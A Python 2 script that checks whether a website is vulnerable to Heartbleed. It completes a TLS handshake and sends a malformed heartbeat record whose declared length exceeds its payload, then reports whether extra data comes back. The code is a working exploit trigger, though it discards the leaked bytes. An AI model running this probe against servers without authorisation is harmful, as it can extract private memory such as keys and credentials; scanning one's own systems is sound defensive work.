#!/usr/bin/python2

import sys
import select
import socket
import struct

port = 443

TLS_ALERT        = 21
TLS_HANDSHAKE    = 22
TLS_HEARTBEAT    = 24
TLS_SERVER_HELLO = 2
TLS_SERVER_DONE  = 14

hello = '160301009a0100009603015344d92abb92c20fbd4ea45804ec9772113085beaf355a0bd45cf30f6c563862000024c02bc02f009e009cc00ac01400390035c007c009c011c0130033003200050004002f000a0100000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101'.decode('hex')

heartbeat = '180301000301f000'.decode('hex')

def recvheader(s):
    header = recvall(s, 5)
    if header == None:
        return None, None, None
    return struct.unpack('>BHH', header)

def recvall(s, length):
    data = ''
    left = length
    while left > 0:
        ready = select.select([s], [], [], 5)
        if ready[0]:
            res = s.recv(left)
            left -= len(res)
            data += res
        else:
            return None

    return data

def recvrecord(s):
    typ, ver, length = recvheader(s)
    if typ == None:
        return None, None, None
    data = recvall(s, length)
    if data == None:
        return None, None, None
    return typ, length, data


def main():
    host = ''
    if len(sys.argv) > 1:
        host = sys.argv[1]
    else:
        print "usage: python " + sys.argv[0] + " website"
        return

    print "Connecting to " + host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    print "Sending ClientHello"
    s.send(hello)

    typ, length, data = recvrecord(s)
    if typ == None:
        print "No response to ClientHello"
        return

    if typ == TLS_HANDSHAKE and ord(data[0]) == TLS_SERVER_HELLO:
        print "Got server hello"

        while True:
            typ, length, data = recvrecord(s)
            if typ == None:
                print "Connection closed"
                return
            print typ, length

            if typ == TLS_HANDSHAKE and ord(data[0]) == TLS_SERVER_DONE:
                print "Received server handshake done"
                break

        print "Sending heartbeat"
        s.send(heartbeat);
        while True:
            typ, length, data = recvrecord(s)
            if typ == None:
                print "No response to heartbeat, website not vulnerable"
                break
            elif typ == TLS_ALERT:
                print "Received TLS_ALERT, Website not vulnerable"
                break
            elif typ == TLS_HEARTBEAT:
                if len(data) > 3:
                    print "Website is vulnerable"
                else:
                    print "Received heartbeat response, but not extra data. Website not vulnerable"
                break
    else:
        print "Didn't get server hello"

main()
